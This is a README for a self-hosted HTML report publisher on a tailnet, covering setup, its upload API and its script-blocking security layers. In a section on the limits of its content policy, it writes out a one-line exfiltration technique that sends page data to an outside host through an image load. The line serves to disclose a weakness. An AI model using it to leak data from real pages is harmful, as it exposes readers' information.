# comms

Publishes one self-contained HTML file to a stable URL on the tailnet. Re-upload
the same file and it becomes a new version at the same URL. This is where the
`html-communication` skill sends a report when you want to read it on your phone
instead of in a terminal.

It is a Bun port of [Postplan](https://www.npmjs.com/package/postplan), Theo
Browne's publisher (MIT), by way of
[geekdada's Cloudflare Workers port](https://github.com/geekdada/postplan). It
runs on the Mac mini `minj` as a launchd agent, on SQLite and the local
filesystem, so nothing touches a cloud account. The stock `postplan` CLI talks
to it unchanged — point it at this server's URL and it cannot tell the
difference.

The worker source in `src/` is geekdada's port, unchanged apart from the two
differences below. `src/adapters.js` supplies the bindings Cloudflare would
otherwise provide: D1 becomes `bun:sqlite`, R2 becomes a directory, and the
assets binding becomes a 404. There is no build step; Bun runs the ESM source
directly.

The environment variables keep their `POSTPLAN_` names. They are read by
upstream code in `src/config.js`, and renaming them would mean editing files
this port deliberately leaves alone. It was called `postplan-local` before it
moved into this repo.

## Differences from upstream

- **Uploads require an API key.** Upstream allows anonymous uploads. Here they
  return 401, because this host now executes uploaded JavaScript.
- **Inline scripts run.** The served Content-Security-Policy is
  `script-src 'unsafe-inline'` instead of `'none'`, so a report's own behaviour
  works: glossary links, collapsible sections, reader-hidden blocks.

So a document is checked twice. `src/html-policy.js` rejects, at upload time:
external scripts (`<script src>` and the SVG spelling `<script href>`), forms,
iframes, frames, `<frameset>`, `<portal>`, `<object>`, `<embed>`, `<applet>`,
`<base>`, `<link>`, inline event handlers, `javascript:` URLs and meta refresh —
including inside a `<template>`, whose children the parser keeps in a separate
fragment. The served CSP is then:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src https: data:; connect-src 'none'; base-uri 'none'; form-action 'none'
```

### What that does not stop

`connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSockets and
`sendBeacon`. It does not block image loads or navigation, and `img-src https:`
allows any https host. An inline script in a published document can therefore
still reach the outside world with `new Image().src = "https://elsewhere/?" +
data`, or by navigating away — both carrying whatever the document contains.

For reports you wrote yourself that is fine. Publishing someone else's document
is a different question, and these two layers do not answer it: treat an upload
as code you are choosing to run in your readers' browsers. `tests/api.test.js`
pins the CSP header and every upload rejection listed above.

## Run it

From `tools/comms` in the agents repo:

```sh
bun install
cp .env.example .env     # then set POSTPLAN_BOOTSTRAP_API_KEY to a real secret
chmod 600 .env
bun run migrate          # idempotent; safe to run again
bun start
bun test
```

`bun start` refuses to boot without `POSTPLAN_BOOTSTRAP_API_KEY` or before the
migrations have run, rather than failing on the first request.

### Configuration

| Variable | Default | Meaning |
|---|---|---|
| `POSTPLAN_BOOTSTRAP_API_KEY` | required | The key that may upload. Mint further keys with `POST /api/api-keys`. |
| `PORT` | `3775` | Local port. |
| `HOST` | `127.0.0.1` | Bind address. Loopback on purpose; Tailscale does the exposing. Move it off loopback and the IP rate limit and `source_ip` below stop being trustworthy, because clients can then set the forwarding header themselves. |
| `POSTPLAN_DATA_DIR` | `./data` | Database and published documents. |
| `POSTPLAN_PUBLIC_BASE_URL` | request origin | The origin used in returned links. |
| `MAX_HTML_BYTES` | `524288` | Size cap per document (512 KB). |
| `UPLOAD_BODY_LIMIT` | `2mb` | Size cap on the whole JSON request. |
| `UPLOAD_IP_RATE_LIMIT_MAX` | `60` per minute | Uploads per client IP, counted before authentication. Over the tailnet the IP is the peer address from `X-Forwarded-For`, which Tailscale Serve sets and does not let a client override. When that header is present nothing else is consulted, so `CF-Connecting-IP` and `X-Real-IP` cannot be used to forge it. |
| `UPLOAD_RATE_LIMIT_MAX` | `30` per minute | Uploads per API key. |
| `POSTPLAN_SESSION_SECRET` | unset | Browser sign-in via shoo.dev. Left unset here, so `/dashboard` and `/settings/api-keys` answer 503. The API is unaffected. |

## Publish a document

```sh
npx postplan auth set <api-key> --api-url https://minj.tail794979.ts.net:8774
npx postplan upload ./report.html --api-url https://minj.tail794979.ts.net:8774
```

Re-uploading the same path adds a version at the same URL; `--new` starts a
separate draft. The CLI keeps its config and path-to-draft mapping in
`~/.postplan`. `POSTPLAN_API_URL` works instead of `--api-url`.

Or without the CLI:

```sh
# first publish: returns the draft id
curl -X POST https://minj.tail794979.ts.net:8774/api/uploads \
  -H "authorization: Bearer $POSTPLAN_API_KEY" \
  -H "content-type: application/json" \
  -d "$(jq -n --rawfile html ./report.html '{html: $html, filename: "report.html"}')"

# every later publish of the same report: pass the draft id back
curl -X POST https://minj.tail794979.ts.net:8774/api/uploads \
  -H "authorization: Bearer $POSTPLAN_API_KEY" \
  -H "content-type: application/json" \
  -d "$(jq -n --rawfile html ./report.html --arg id "$DRAFT_ID" \
        '{html: $html, filename: "report.html", draftId: $id}')"
```

Versioning in place is the CLI's doing, not the server's: `postplan` remembers
the path-to-draft mapping in `~/.postplan/drafts.json` and sends `draftId` for
you. Over raw `curl` there is no memory, so a call without `draftId` always
creates a new draft at a new URL — keep the id the first call returned.

Past versions stay reachable at `/d/<draft-id>/v/<n>`. `DELETE /api/drafts/<id>`
unpublishes a draft; `POST /api/drafts/<id>/disable` takes it down with a reason.

### What a document may contain

One self-contained HTML file. Images must be `data:` URIs or `https:` URLs;
there is no companion-file upload, so `<img src="chart.png">` will 404. Inline
`<style>` and `<script>` are fine. 512 KB is the ceiling.

## Reach

| Layer | Address | Who can get there |
|---|---|---|
| Bun process | `127.0.0.1:3775` | this machine only |
| Tailscale Serve | `https://minj.tail794979.ts.net:8774` | anything signed into the tailnet |
| Tailscale Funnel | off | deliberately; it would make the same hostname public |

```sh
tailscale serve status
tailscale serve --bg --https=8774 http://127.0.0.1:3775   # publish it
tailscale serve --https=8774 off                          # remove
```

## Running as a service

A launchd agent keeps it up and restarts it after a reboot.

```sh
cp com.wahringer.comms.plist.example com.wahringer.comms.plist
# put the real key in the copy, then
chmod 600 com.wahringer.comms.plist
cp com.wahringer.comms.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.wahringer.comms.plist
```

```sh
# restart after a code change
launchctl unload ~/Library/LaunchAgents/com.wahringer.comms.plist
launchctl load   ~/Library/LaunchAgents/com.wahringer.comms.plist

curl -s -o /dev/null -w '%{http_code}\n' https://minj.tail794979.ts.net:8774/healthz  # 200
tail -f ~/.local/share/comms/comms.log
```

### The service runs from this checkout

The plist points launchd at `/Users/minj/Projects/agents/tools/comms/server.js`
in this working tree — not at the installed copy under
`~/.local/share/agents/source`, which has no `node_modules` and is replaced on
every `agents update`. So the running service depends on this directory staying
where it is, with its `node_modules` present, on whatever branch is checked out
here. Things that would take it away:

- `git clean -xd`, which deletes `node_modules` — never run it in this repo.
- `git clean -d` or `git stash -u` while `tools/` is still untracked.
- checking out a branch that predates `tools/comms`.

Any of those leaves launchd restarting a server that cannot start. If it
happens, restore the directory, run `bun install`, and reload the agent.

The plist hard-codes three absolute paths: `/opt/homebrew/bin/bun`, this
directory, and the data directory `~/.local/share/comms` (which appears again in
both log paths). Adjust all three if anything moves.

launchd appends stdout and stderr to `~/.local/share/comms/comms.log` verbatim
and never rotates it, so truncate it when it grows. The server dates its own startup,
shutdown and fatal lines; a stack trace thrown by the runtime itself arrives
undated, so read it against the neighbouring timestamped line. Lines written
before this was added carry no date at all.

The service needs free disk. Every upload writes a version file and a SQLite WAL
transaction under `~/.local/share/comms`, so a full volume breaks uploads while the process
stays up and `/healthz`, which only reads, may well keep answering 200.
`KeepAlive` cannot help with that — it is a disk problem, not a process one.
Check `df -h /` when uploads start failing.

## Data and secrets

State lives in `~/.local/share/comms`, deliberately outside every repo so an
`agents update` cannot disturb it:

```
postplan.sqlite                                        metadata, no document bodies
drafts/drafts/<draft-id>/versions/<id>.html            one file per version
drafts/.r2-meta/drafts/<draft-id>/versions/<id>.html.json   the content type R2 would have stored
comms.log                                              service output
```

The doubled `drafts/` is not a typo: `drafts` is the bucket directory, and the
object keys the worker writes already start with `drafts/`.

Copy that directory and you have copied every published report. Nothing else is
state.
The database runs in WAL mode, so a file-by-file copy of a running service is not
a consistent snapshot. Either stop the service and copy the
directory, or back it up live with SQLite's own backup:

```sh
sqlite3 ~/.local/share/comms/postplan.sqlite ".backup /path/to/comms-backup.sqlite"
cp -R ~/.local/share/comms/drafts /path/to/drafts-backup
```

The API key lives in `.env` and inside the installed plist, both `chmod 600` and
both gitignored. `.env.example` and `com.wahringer.comms.plist.example` carry
`replace-me` and are the only committed copies. The server never logs the key,
and keys are stored only as SHA-256 hashes; comparison against the bootstrap key
is constant-time.

## What the local adapters do not do

`src/adapters.js` is honest about its limits rather than quietly wrong: R2's
`range` and `onlyIf` options throw from `get()` and `put()` instead of being
ignored, and D1 result `meta` carries only the counters SQLite can actually
supply — `size_after` and `served_by` are left out rather than faked. Where D1
raises, so does this: an unknown column in `first(column)`, or `undefined` passed
to `bind()`. The pieces `src/` uses are covered by `tests/adapters.test.js`.

## Licence

MIT, inherited from upstream. See `LICENSE`.
